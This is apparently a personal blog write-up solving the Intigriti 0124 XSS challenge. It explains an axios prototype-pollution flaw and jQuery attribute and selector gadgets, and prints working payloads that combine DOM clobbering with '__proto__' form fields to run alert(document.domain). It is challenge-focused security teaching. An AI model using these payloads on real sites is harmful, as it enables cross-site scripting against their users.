---
title: Intigriti 0124 XSS Writeup
date: 2024-02-17 13:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/intigriti-0124-writeup/cover-en.png
---

Last month's (January 2024) Intigriti challenge was very interesting, made by [@kevin_mizu](https://twitter.com/kevin_mizu). I have often seen him post client-side related challenges on Twitter before, and this time the quality of the challenge was as good as ever, worth documenting.

The challenge link is here, if you haven't seen it yet, you can take a look: https://challenge-0124.intigriti.io/

<!-- more -->

## Easier than expected?

The code for the challenge is quite short. Let's start with the frontend part, which is basically just an HTML:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Intigriti XSS Challenge</title>
    <link rel="stylesheet" href="/static/css/main.css">
</head>
<body>

<h2>Hey <%- name %>,<br>Which repo are you looking for?</h2>

<form id="search">
    <input name="q" value="<%= search %>">
</form>

<hr>

<img src="/static/img/loading.gif" class="loading" width="50px" hidden><br>
<img class="avatar" width="35%">
<p id="description"></p>
<iframe id="homepage" hidden></iframe>

<script src="/static/js/axios.min.js"></script>
<script src="/static/js/jquery-3.7.1.min.js"></script>
<script>
    function search(name) {
        $("img.loading").attr("hidden", false);

        axios.post("/search", $("#search").get(0), {
            "headers": { "Content-Type": "application/json" }
        }).then((d) => {
            $("img.loading").attr("hidden", true);
            const repo = d.data;
            if (!repo.owner) {
                alert("Not found!");
                return;
            };

            $("img.avatar").attr("src", repo.owner.avatar_url);
            $("#description").text(repo.description);
            if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
                });
            };
        });
    };

    window.onload = () => {
        const params = new URLSearchParams(location.search);
        if (params.get("search")) search();

        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
    };
</script>
</body>
</html>

```

The part `<h2>Hey <%- name %>` is the only part related to the backend, where DOMPurify is used for sanitization:

``` js
app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
  return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search
    });
});
```

It's worth noting the `SANITIZE_DOM: false` here, which disables protection against DOM Clobbering. This suggests that the challenge is related to DOM Clobbering, as this setting is deliberately turned off.

The main logic of the challenge is in the `search` function:

``` js
function search(name) {
    $("img.loading").attr("hidden", false);

    axios.post("/search", $("#search").get(0), {
        "headers": { "Content-Type": "application/json" }
    }).then((d) => {
        $("img.loading").attr("hidden", true);
        const repo = d.data;
        if (!repo.owner) {
            alert("Not found!");
            return;
        };

        $("img.avatar").attr("src", repo.owner.avatar_url);
        $("#description").text(repo.description);
        if (repo.homepage && repo.homepage.startsWith("https://")) {
            $("#homepage").attr({
                "src": repo.homepage,
                "hidden": false
            });
        };
    });
};
```

Actually, there doesn't seem to be any vulnerability in the above code snippet. So after reviewing it, I went to check the libraries used in the challenge, which are jQuery 3.7.1 and axios 1.6.2. Although the file names were not mentioned, it was evident from the file contents.

Upon investigation, it was found that 1.6.2 is not the latest version, and a prototype pollution vulnerability was fixed in version 1.6.4: https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e

The commit even includes an exploit directly, great:

``` js
it('should resist prototype pollution CVE', () => {
    const formData = new FormData();

    formData.append('foo[0]', '1');
    formData.append('foo[1]', '2');
    formData.append('__proto__.x', 'hack');
    formData.append('constructor.prototype.y', 'value');

    expect(formDataToJSON(formData)).toEqual({
      foo: ['1', '2'],
      constructor: {
        prototype: {
          y: 'value'
        }
      }
    });

    expect({}.x).toEqual(undefined);
    expect({}.y).toEqual(undefined);
});
```

From the commit, it can be seen that axios has a function called `formDataToJSON` that converts FormData to JSON, and the conversion code contains a vulnerability that can be exploited through the `name` parameter for prototype pollution.

Moving back to the challenge code, there is a part that executes: `axios.post("/search", $("#search").get(0)`, so as long as we can control `#search`, we can control the parameters passed here. It can be seen from the axios source code that the form passed here will eventually be converted to FormData and passed to `formDataToJSON`.

Therefore, we can inject a `<form>` using the `name` to perform prototype pollution. The next step is to find a gadget, usually starting with objects.

A suspicious part of the code is:

``` js
$("#homepage").attr({
    "src": repo.homepage,
    "hidden": false
});
```

The parameter passed here is an object, and if the `.attr` function does not have specific checks, it could be affected by polluted parameters. In fact, in jQuery, the implementation of [attr](https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16) is as follows:

``` js
jQuery.fn.extend( {
    attr: function( name, value ) {
        return access( this, jQuery.attr, name, value, arguments.length > 1 );
    },
}
```

The implementation of [access](https://github.com/jquery/jquery/blob/main/src/core/access.js#L12) is:

``` js
export function access( elems, fn, key, value, chainable, emptyGet, raw ) {
    var i = 0,
        len = elems.length,
        bulk = key == null;

    // Sets many values
    if ( toType( key ) === "object" ) {
        chainable = true;
        for ( i in key ) {
            access( elems, fn, i, key[ i ], true, emptyGet, raw );
        }
    }
}
```

If the key passed is an object, it will use `in` to retrieve each key. Since `in` retrieves properties on the prototype chain, we can pollute `onload` to let jQuery set the onload attribute.

The payload is as follows:

``` html
<form id=search>
  <input name=__proto__.onload value=alert(document.domain)>
  <input name=q value=react-d3><
</form>
```

It may seem fine, but upon testing, an error occurs:

```
Uncaught (in promise) TypeError: Cannot use 'in' operator to search for 'set' in alert(document.domain)
```

After a while of debugging, it was found that the error originated from this section when setting the `attr`:

``` js
// Attribute hooks are determined by the lowercase version
// Grab necessary hook if one is defined
if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) {
    hooks = jQuery.attrHooks[ name.toLowerCase() ] ||
        ( jQuery.expr.match.bool.test( name ) ? boolHook : undefined );
}

if ( value !== undefined ) {
    if ( value === null ) {
        jQuery.removeAttr( elem, name );
        return;
    }

    if ( hooks && "set" in hooks &&
        ( ret = hooks.set( elem, value, name ) ) !== undefined ) {
        return ret;
    }

    elem.setAttribute( name, value + "" );
    return value;
}
```

It first executes `hooks = jQuery.attrHooks[ name.toLowerCase() ]`, since we polluted the `onload` attribute, `jQuery.attrHooks['onload']` will be a string, making `hooks` a string as well.

Next, it reaches `"set" in hooks`, as strings do not have `in` to use, hence throwing the error seen earlier.

Now that we know where the problem lies, the solution is simple. Changing `onload` to `Onload` will suffice, as this way `name.toLowerCase()` will be `onload`, and `jQuery.attrHooks['onload']` will not exist.

With this, the issue is resolved. It was much easier than I had imagined, taking about 3-4 hours. Then, I saw the author's [tweet](https://twitter.com/kevin_mizu/status/1744552795410456756) and realized it was an unintended, explaining why it was less challenging than expected.

## Intended solution is not that difficult as well...or is it?

Knowing that my solution was unintended, I began to think about what the intended solution might be. The author mentioned in Discord that the intended solution and the current unintended solution used completely different approaches, so it could be assumed that the `attr({})` part was to be excluded, leaving only the remaining code:

``` js
function search(name) {
    $("img.loading").attr("hidden", false);

    axios.post("/search", $("#search").get(0), {
        "headers": { "Content-Type": "application/json" }
    }).then((d) => {
        $("img.loading").attr("hidden", true);
        const repo = d.data;
        if (!repo.owner) {
            alert("Not found!");
            return;
        };

        $("img.avatar").attr("src", repo.owner.avatar_url);
        $("#description").text(repo.description);
    });
};
```

Within the remaining code, my intuition told me that the focus was on this line:

``` js
$("img.avatar").attr("src", repo.owner.avatar_url);
```

If we could use prototype pollution to change `$("img.avatar")` to `$('#homepage')`, selecting that iframe, and then with control over `repo.owner.avatar_url`, we could set the iframe's src to `javascript:alert(1)`, achieving XSS.

This guess seemed very reasonable, with about a 90% chance of being correct, as using prototype pollution to affect selectors seemed new, at least to me, and it was cool! It also aligned with the author's tweet: "super interesting."

So, I spent some time exploring how selectors work, but the code turned out to be more complex than I had imagined, involving many functions.

After four to five hours, I finally found a point to exploit.

When executing `$()`, it uses [find](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197) to locate the corresponding elements. There is a check for `documentIsHTML`, and if it is true, it typically uses native APIs like querySelector to search, with no room for manipulation.

Therefore, we needed to make it false. The code for this check is [here](https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330). By making `isXMLDoc` return true, `documentIsHTML` will be false:

``` js
isXMLDoc: function( elem ) {
    var namespace = elem && elem.namespaceURI,
        docElem = elem && ( elem.ownerDocument || elem ).documentElement;

    // Assume HTML when documentElement doesn't yet exist, such as inside
    // document fragments.
    return !rhtmlSuffix.test( namespace || docElem && docElem.nodeName || "HTML" );
},
```

We can use DOM clobbering to overwrite `documentElement`, turning `docElem` into an `<img>`. This change would invalidate the check and set `isXMLDoc` to true because `documentElement` is not `<html>`.

After bypassing the check, native APIs were temporarily not used, and the [select](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L2001) function was executed, starting with tokenizing the selector:

``` js
function tokenize( selector, parseOnly ) {
    var matched, match, tokens, type,
        soFar, groups, preFilters,
        cached = tokenCache[ selector + " " ];

    if ( cached ) {
        return parseOnly ? 0 : cached.slice( 0 );
    }

    // ...
}
```

This seemed to be the target!

By polluting `img.avatar `, we could control the `tokenCache` content, influencing the tokenization result to directly replace it with the iframe we wanted to select.

It appears the expected solution wasn't that difficult after all.

However, after attempting it, it was found to be ineffective.

The reason it didn't work was not due to a wrong gadget but rather the prototype pollution aspect. This led to revisiting and studying the axios vulnerability exploit that was previously overlooked.

Axios works like this when converting the form name to a JSON key, as shown [here](https://github.com/axios/axios/blob/v1.6.4/lib/helpers/formDataToJSON.js#L12):

``` js
/**
 * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z']
 *
 * @param {string} name - The name of the property to get.
 *
 * @returns An array of strings.
 */
function parsePropPath(name) {
  // foo[x][y][z]
  // foo.x.y.z
  // foo-x-y-z
  // foo x y z
  return utils.matchAll(/\w+|\[(\w*)]/g, name).map(match => {
    return match[0] === '[]' ? '' : match[1] || match[0];
  });
}
```

It treats any characters other than A-Za-z0-9_ as separators, so spaces cannot be part of the property name. I spent three to four hours here and couldn't find any way to bypass this.

At this point, I realized I was wrong, this challenge was not that simple...

## One of the three most common illusions: I can solve It

After a day, I continued to look at this challenge. Since I couldn't use spaces, there must be another way to exploit it. So, I continued to trace how the code works.

If you keep tracing down, you will reach the function [matcherFromTokens](https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1766). However, the code inside is complex and lengthy. When I first saw it, I thought, "Forget it, I'll wait for the solution."

But after a day, I gathered my spirits and started over. I found a place to pollute before entering tokenize:

``` js
function select( selector, context, results, seed ) {
  var i, tokens, token, type, find,
    compiled = typeof selector === "function" && selector,
    match = !seed && tokenize( ( selector = compiled.selector || selector ) );
// ...
}
```

Here, there is `selector = compiled.selector || selector`. So, if I pollute `selector`, I can change the selector arbitrarily.

Just as I was feeling proud of my cleverness, reality came crashing down on me. After polluting the selector, an error occurred when entering tokenize because this part:

``` js
// Filters
for ( type in filterMatchExpr ) {
    if ( ( match = jQuery.expr.match[ type ].exec( soFar ) ) && ( !preFilters[ type ] ||
        ( match = preFilters[ type ]( match ) ) ) ) {
        matched = match.shift();
        tokens.push( {
            value: matched,
            type: type,
            matches: match
        } );
        soFar = soFar.slice( matched.length );
    }
}
```

By polluting the selector, when executing `type in filterMatchExpr`, the polluted selector will be retrieved. Then, it proceeds to `jQuery.expr.match[type].exec`, which causes an error because a string does not have the `exec` method.

In other words, no matter what we pollute, once we enter tokenize, an error will occur. Therefore, trying to directly pollute the selector as an iframe is not possible.

However, we can pollute the selector with something already in the cache, such as `img.loading`, to bypass the error in tokenize.

But this only prevents the program from breaking, it still doesn't solve the challenge.

## Hint to the rescue

After another day or two, I saw the author's [hint](https://twitter.com/kevin_mizu/status/1749740885657755842) on Twitter, clearly pointing out that the key was the `addCombinator` I had previously overlooked due to its complexity. From the hint, it was evident that I was just one step away.

So, I gritted my teeth for about half a day, traced this part of the code a bit, and finally got the expected answer.

Here is the final payload:

``` html
<img name=documentElement>
<form id="search">
    <input name="__proto__.owner.avatar_url" value="javascript:alert(document.domain)">
    <input name="__proto__.CLASS.a" value="1">
    <input name="__proto__.TAG.a" value="1">
    <input name="__proto__.dir" value="parentNode">
    <input name="__proto__.selector" value="img.loading">
</form>
```

In fact, the last part with `addCombinator` was a bit of a guess and a bit of actual knowledge. It's like a part where `dir` is used to find matching elements, setting it as the parentNode will keep searching upwards, eventually matching the entire HTML element. This will add `src` to every element, including iframes.

I've forgotten the details of each function because it was quite complex. If you're interested, you can directly read the original author's writeup (link provided below).

## Afterword

I really enjoyed the gradual progression of this challenge, from initially finding an unintended solution and thinking it was simple, to finding the first cache location and thinking I had solved it, only to realize that axios's prototype pollution couldn't be used. Then, finding the second `compiled.selector` and thinking it was over, only to discover it wasn't.

To keep digging deeper until reaching `addCombinator` to confirm that this challenge could indeed be solved, experiencing so many emotional ups and downs within a single challenge indicates that the challenge was well-designed. Another aspect I liked was that it forced you to review the code; without looking at the code, it was impossible to solve. I enjoy code reviews, so I really liked this challenge.

I admire the author's ability to continue exploring deeper and find this very interesting solution, combining DOM clobbering and prototype pollution, modifying the jQuery selector's reference, and creating such a fun challenge!

I recommend the author's writeup, which goes through a similar process as mine: [Intigriti January 2024 - XSS Challenge](https://mizu.re/post/intigriti-january-2024-xss-challenge)

In addition, another unintended solution found by @joaxcar is also interesting. If you are interested, you can take a look at: [Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)](https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/)

If you are interested in the original topic, you can also refer to it here: https://bugology.intigriti.io/intigriti-monthly-challenges/0124
